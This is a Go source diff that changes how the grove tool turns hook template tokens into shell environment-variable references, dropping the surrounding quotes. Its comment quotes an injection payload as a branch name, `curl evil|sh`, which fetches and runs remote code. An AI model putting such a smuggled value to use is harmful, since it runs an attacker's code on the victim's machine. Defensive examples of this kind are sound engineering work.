@@ -258,15 +258,17 @@ func (v *Variables) shellVarBindings() []shellVarBinding {
 }
 
 // InterpolateShell rewrites a command-hook string for safe execution via
-// `sh -c`. Each {{.x}} token is replaced with a *quoted environment-variable
-// reference* ("${GROVE_HOOK_x}") rather than the literal value, and the real
-// values are supplied out-of-band via ShellEnv. The shell expands the
-// reference as opaque data, so metacharacters in a value can never inject a
-// command — critical because grove interpolates values it doesn't control
-// (notably {{.branch}}, and grove checks out branches from untrusted PRs via
-// `grove fetch pr/<N>`, so a branch named `x";curl evil|sh;"` must not run).
-// Quoting the reference keeps it safe even when the template embeds the token
-// inside its own quotes, e.g. echo "switched to {{.branch}}".
+// `sh -c`. Each {{.x}} token is replaced with an environment-variable
+// reference (${GROVE_HOOK_x}) rather than the literal value, and the real
+// values are supplied out-of-band via ShellEnv. Because parameter expansion
+// happens *after* the shell has parsed the command, metacharacters in a value
+// can never inject a command — critical because grove interpolates values it
+// doesn't control (notably {{.branch}}, and grove checks out branches from
+// untrusted PRs via `grove fetch pr/<N>`, so a branch named `x";curl evil|sh;"`
+// must not run). The reference is left unquoted so it expands correctly whether
+// the template wraps the token in double quotes (echo "switched to
+// {{.branch}}", the common case — the value stays a single word) or leaves it
+// bare; a value is never re-parsed for operators either way.
 //
 // Interpolate (literal substitution) remains correct for filesystem paths and
 // template bodies, which Go handles directly and which never reach a shell.
@@ -274,7 +276,7 @@ func (v *Variables) InterpolateShell(s string) string {
 	bindings := v.shellVarBindings()
 	pairs := make([]string, 0, len(bindings)*2)
 	for _, b := range bindings {
-		pairs = append(pairs, b.token, `"${`+b.env+`}"`)
+		pairs = append(pairs, b.token, "${"+b.env+"}")
 	}
 	return strings.NewReplacer(pairs...).Replace(s)
 }
